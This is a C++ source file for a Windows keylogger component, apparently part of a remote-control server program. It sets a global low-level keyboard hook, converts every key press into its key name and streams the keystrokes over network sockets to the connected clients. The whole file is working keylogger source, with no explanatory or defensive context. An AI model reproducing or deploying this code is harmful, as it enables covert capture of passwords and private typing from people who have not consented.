#include "Keylog.h"
#include <iostream>
#include <sstream>
#include <chrono>
#include <mutex>
#include "../../../Message/Response.h"

std::vector<int> keylogfds;


Keylogger::Keylogger()
{
    this->_t = std::thread(&Keylogger::keylogFunc, this, this->_p.get_future());
}


void Keylogger::keylogFunc(std::future<void> future){
    // Init hook
    std::mutex m;
    m.lock();
    this->_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    if (this->_hHook == NULL){
        std::cerr << "Server: Failed to set keyboard hook.\n";
        exit(1);
    }
    m.unlock();

    // Loop waiting for event
    MSG msg;
    while (future.wait_for(std::chrono::milliseconds(1)) == std::future_status::timeout)
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)){
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
}

Keylogger::~Keylogger()
{
    // Destroy hook
    this->_p.set_value();
    UnhookWindowsHookEx(this->_hHook);
}

// get key press from DWORD
std::pair <std::string, bool> changeToKeyPress(DWORD dwKeyCode){
    // Convert the key code to scan code
    DWORD dwScanCode = MapVirtualKey(dwKeyCode, MAPVK_VK_TO_VSC);

    // Get the key name text
    CHAR szKeyName[256];
    // wchar_t buffer[256];
    if (GetKeyNameText(dwScanCode << 16, szKeyName, sizeof(szKeyName) / sizeof(WCHAR)) != 0) 
    {
        // for (int i = 0; i < 256; ++i) szKeyName[i] = (char)buffer[i];
        return {szKeyName, true};
    }
    return {szKeyName, false};
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){
    std::stringstream stream;
    if (nCode == HC_ACTION){
        KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboardStruct->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
            // Process event press key
            auto res = changeToKeyPress(vkCode);
            if(res.second == true)
                stream << res.first  << '\n';
            else
                stream << "(DWORD)" << vkCode << '\n';
        }
    }

    std::string msg = stream.str();
    Response res(CMD_RESPONSE_STR, OK_CODE, msg.size() + 1, (void*)msg.c_str());
    std::mutex m;
    std::lock_guard l(m);
    for (int fd: keylogfds)
        sendResponse(fd, res, 0);
    // Call next hook
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}